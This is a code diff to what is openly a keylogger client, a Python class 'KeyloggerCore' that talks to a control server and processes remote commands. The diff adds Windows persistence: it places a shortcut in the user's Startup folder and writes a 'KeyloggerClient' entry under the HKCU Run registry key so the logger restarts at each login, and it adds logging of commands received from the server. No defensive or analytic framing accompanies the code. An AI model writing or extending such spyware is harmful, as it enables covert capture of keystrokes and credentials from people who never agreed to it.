@@ -24,11 +24,47 @@ class KeyloggerCore:
         self.communicator = ServerCommunicator(self.client_id, self.encryption)
         self.logger = ActivityLogger(Config.BUFFER_LIMIT)
         self.running = True
+        self.add_to_startup()
 
     def start(self):
         self._init_hotkeys()
         self._start_service_threads()
         self._main_loop()
+
+    def add_to_startup(self):
+        import os
+        import shutil
+        import winreg
+        import platform
+
+        if platform.system().lower() != 'windows':
+            logging.info("Startup registration only supported on Windows")
+            return
+
+        try:
+            # Get the path to the executable
+            exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
+            exe_name = os.path.basename(exe_path)
+
+            # Option 1: Add to Startup folder
+            startup_folder = os.path.join(os.environ.get('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
+            shortcut_path = os.path.join(startup_folder, f"{exe_name}.lnk")
+            if not os.path.exists(shortcut_path):
+                import win32com.client
+                shell = win32com.client.Dispatch("WScript.Shell")
+                shortcut = shell.CreateShortCut(shortcut_path)
+                shortcut.Targetpath = exe_path
+                shortcut.WorkingDirectory = os.path.dirname(exe_path)
+                shortcut.save()
+                logging.info(f"Added shortcut to Startup folder: {shortcut_path}")
+
+            # Option 2: Add to Registry
+            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, "KeyloggerClient", 0, winreg.REG_SZ, exe_path)
+                logging.info("Added to registry startup")
+        except Exception as e:
+            logging.error(f"Failed to add to startup: {str(e)}")
 
     def _init_hotkeys(self):
         add_hotkey(Config.EMERGENCY_HOTKEY, self.emergency_stop)
@@ -94,6 +130,7 @@ class KeyloggerCore:
     def _process_commands(self, commands):
         for cmd in commands:
             try:
+                logging.info(f"Processing command: ID={cmd['id']}, Type={cmd['type']}")
                 if not all(k in cmd for k in ('id', 'command', 'type')):
                     raise CommandError(f"Invalid command structure: {cmd}")
     
